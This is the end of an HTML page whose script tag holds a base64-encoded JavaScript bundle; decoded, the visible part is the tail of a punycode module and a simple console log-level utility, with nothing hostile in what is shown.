V09YlttXSk7ZWxzZSByLnB1bnljb2RlPWJ9KHRoaXMpfSkuY2FsbCh0aGlzLCJ1bmRlZmluZWQiIT10eXBlb2YgZ2xvYmFsP2dsb2JhbDoidW5kZWZpbmVkIiE9dHlwZW9mIHNlbGY/c2VsZjoidW5kZWZpbmVkIiE9dHlwZW9mIHdpbmRvdz93aW5kb3c6e30pfSx7fV0sMjY6W2Z1bmN0aW9uKGUsdCxuKXtmdW5jdGlvbiByKGUsdCl7Y29uc3Qgbj1hW3RdO3ZvaWQgMCE9PW4mJihuPjAmJihlLmFzc2VydD1mdW5jdGlvbigpe30pLG4+NSYmKGUudHJhY2U9ZnVuY3Rpb24oKXt9KSxuPjEwJiYoZS5kZWJ1Zz1mdW5jdGlvbigpe30pLG4+MjAmJihlLmxvZz1mdW5jdGlvbigpe30pLG4+MzAmJihlLmluZm89ZnVuY3Rpb24oKXt9KSxuPjQwJiYoZS53YXJuPWZ1bmN0aW9uKCl7fSksbj41MCYmKGUuZXJyb3I9ZnVuY3Rpb24oKXt9KSl9ZnVuY3Rpb24gbyhlLHQpe3Q9dHx8e307Y29uc3Qgbj10LmxldmVsfHwiZGVidWciO3IoZSxuKX1mdW5jdGlvbiBpKGUpe2NvbnN0IHQ9T2JqZWN0LmNyZWF0ZShjb25zb2xlKTtyZXR1cm4gbyh0LGUpLHR9Y29uc3QgYT17YWxsOjAsdHJhY2U6NSxkZWJ1ZzoxMCxsb2c6MjAsaW5mbzozMCx3YXJuOjQwLGVycm9yOjUwfSxjPWkoKTt0LmV4cG9ydHM9e2xvZ2dlcjpjLGNvbmZpZ3VyZTpvLGNyZWF0ZTppfX0se31dfSx7fSxbMV0pOw=="));</script>
        
</body>
</html>